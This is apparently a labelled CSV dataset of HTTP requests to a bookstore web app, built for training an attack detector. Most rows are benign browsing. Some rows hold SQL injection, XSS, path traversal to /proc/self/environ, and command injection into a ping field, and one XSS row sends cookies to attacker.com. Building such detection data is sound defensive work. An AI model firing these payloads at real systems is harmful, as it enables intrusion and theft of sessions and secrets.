method,path,query_params,headers,body,client_ip,user_agent,label,attack_type
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; echo d2hvYW1p | base64 -d | sh""}",192.168.1.151,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),4,CMD
GET,/api/v1/books/38/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.238,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=%2527%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.200,Go-http-client/1.1,1,SQLI
POST,/rate/25/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 2, ""comment"": ""A must-read classic in modern computer science and software design.""}",10.0.0.190,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
GET,/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.2.59,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<details open ontoggle=alert(1)>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<details open ontoggle=alert(1)>""}",192.168.1.151,Go-http-client/1.1,2,XSS
POST,/rate/30/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<svg/onload=alert('PBL6')>""}",10.0.0.88,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,2,XSS
POST,/api/v1/books/29/progress/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""last_page"": 65, ""is_finished"": true}",10.0.0.164,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=Arthur+Conan+Doyle,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.126,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/ebooks/,sort=popular&page=4,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.2.200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 15, ""rating"": 3, ""review_text"": ""Highly recommended for software engineers and architects!""}",10.0.0.207,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
GET,/books/,category=%2527%2520OR%25201%253D1%2520--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Wget/1.21.3"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.200,Wget/1.21.3,1,SQLI
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR 1=1 --"", ""password"": ""password""}",10.0.0.99,Go-http-client/1.1,1,SQLI
GET,/api/v1/cart/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.34,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/books/47/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.2.118,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
GET,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.23,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/files/download/,file=../../manage.py%00.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,192.168.1.150,Go-http-client/1.1,3,PATH
GET,/api/v1/books/,page_size=50,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.36,"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",0,BENIGN
POST,/api/v1/vulnerable/admin/ping/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""host"": ""127.0.0.1; $(id)""}",172.16.5.55,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",4,CMD
GET,/api/search/,q=TypeScript,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,192.168.1.110,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
GET,/categories/6/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.173,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/api/search/,q=MongoDB&page=3,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,10.0.0.199,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
POST,/rate/40/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Go-http-client/1.1"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 5, ""comment"": ""<script>document.location='http://attacker.com/steal?c='+document.cookie</script>""}",192.168.1.200,Go-http-client/1.1,2,XSS
POST,/contact/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""name"": ""<img/src='invalid'/onerror='alert(\""XSS\"")'>"", ""email"": ""attacker@evil.com"", ""subject"": ""Hỏi đáp bảo mật"", ""message"": ""<img/src='invalid'/onerror='alert(\""XSS\"")'>""}",198.51.100.23,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2,XSS
GET,/api/search/,q=Martin+Fowler,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.2.62,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0,0,BENIGN
GET,/books/18/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.42,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=Django,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,172.16.1.170,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=admin'/*,"{""Host"": ""localhost:8000"", ""User-Agent"": ""python-requests/2.31.0"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,203.0.113.45,python-requests/2.31.0,1,SQLI
GET,/api/v1/vulnerable/files/download/,file=../../../../proc/self/environ,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive""}",,10.0.0.99,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",3,PATH
GET,/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.1.189,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
POST,/api/v1/vulnerable/reviews/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""book_id"": 27, ""rating"": 5, ""review_text"": ""Sách hay! <script src='http://attacker.com/xss.js'></script>""}",172.16.4.12,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",2,XSS
POST,/api/v1/vulnerable/auth/login/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""username"": ""' OR 5-2=3--"", ""password"": """"}",172.16.4.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",1,SQLI
GET,/api/v1/vulnerable/files/download/,file=sample_chapter_2.pdf,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,192.168.1.188,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",0,BENIGN
POST,/rate/3/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}","{""score"": 4, ""comment"": ""Sách rất hay, trình bày khoa học và dễ hiểu.""}",172.16.2.39,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.66",0,BENIGN
GET,/categories/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.2.103,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",0,BENIGN
GET,/books/20/read/,,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,10.0.0.183,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,BENIGN
GET,/api/v1/vulnerable/books/search/,q=' OR 5-2=3--,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Nikto/2.1.6"", ""Accept"": ""application/json"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""keep-alive"", ""Content-Type"": ""application/json""}",,203.0.113.45,Nikto/2.1.6,1,SQLI
GET,/books/,page=3&price_min=100000&price_max=250000,"{""Host"": ""localhost:8000"", ""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Language"": ""vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Connection"": ""keep-alive""}",,172.16.2.12,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",0,BENIGN
